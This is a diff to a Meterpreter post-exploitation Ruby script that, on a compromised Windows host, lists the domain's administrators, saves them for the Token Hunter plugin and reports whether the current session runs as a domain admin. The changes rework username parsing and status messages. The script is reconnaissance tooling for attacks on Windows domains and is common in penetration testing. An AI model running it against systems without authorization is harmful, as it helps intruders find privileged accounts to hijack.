@@ -1,4 +1,4 @@
-#$Id$
+#$Id:$
 #Meterpreter script for generating domain admin list to be used with Token Hunter plugin
 #Provided by Carlos Perez at carlos_perez[at]darkoperator[dot]com
 #Verion: 0.1
@@ -24,7 +24,7 @@ opts.parse(args) { |opt, idx, val|
 users = ""
 list = []
 host = @client.sys.config.sysinfo['Computer']
-current_user = client.sys.config.getuid.scan(/\S*\\(\S*)/)
+current_user = client.sys.config.getuid.scan(/\S*\\(.*)/)
 domain = @client.fs.file.expand_path("%USERDOMAIN%")
 # Create Filename info to be appended to downloaded files
 filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")+"-"+sprintf("%.5d",rand(100000))
@@ -64,11 +64,12 @@ a_size = (out_lines.length - 8)
 domadmins = out_lines.slice(6,a_size)
 #get only the usernames out of those lines
 domainadmin_user_list = []
-domadmins.each do |da|
-	da.scan(/(\w*)\b\s/).each do |acc|
-		domainadmin_user_list << acc.join.strip
+domadmins.each do |d|
+	d.split("  ").compact.each do |s|
+		domainadmin_user_list << s.strip if s.strip != ""
 	end
 end
+
 #process accounts found
 print_status("Accounts Found:")
 domainadmin_user_list.each do |u|
@@ -76,8 +77,8 @@ domainadmin_user_list.each do |u|
 	filewrt(dest, "#{domain}\\#{u}")
 	list << u
 end
-if list.index(current_user.join)
-	print_status("Current sessions running as Domain Admin!!")
+if list.index(current_user.join.chomp)
+	print_status("Current sessions running as #{domain}\\#{current_user.join.chomp} is a Domain Admin!!")
 else
-	print_error("Current session is not running as Domain Admin")
+	print_error("Current session running as #{domain}\\#{current_user.join.chomp} is not running as Domain Admin")
 end
